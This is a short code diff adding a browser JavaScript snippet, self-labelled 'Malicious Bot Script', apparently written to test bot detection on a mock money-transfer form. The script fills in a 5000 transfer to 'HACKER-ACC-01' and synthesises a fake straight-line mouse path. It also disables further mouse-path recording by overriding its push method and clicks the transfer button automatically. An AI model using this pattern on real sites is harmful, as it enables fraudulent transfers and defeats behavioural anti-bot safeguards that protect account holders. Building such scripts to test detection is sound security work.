@@ -1,0 +1,18 @@
+console.log("🤖 Initiating Malicious Bot Script...");
+
+document.getElementById('tx-amount').value = '5000';
+document.getElementById('tx-account').value = 'HACKER-ACC-01';
+document.getElementById('tx-name').value = 'Automated Script';
+
+
+mousePath = []; 
+for(let i = 0; i <= 100; i++) {
+    mousePath.push({x: 100 + i, y: 100 + i}); 
+}
+
+mousePath.push = function() { return false; };
+
+
+setTimeout(() => {
+    document.getElementById('transfer-btn').click();
+}, 500); 
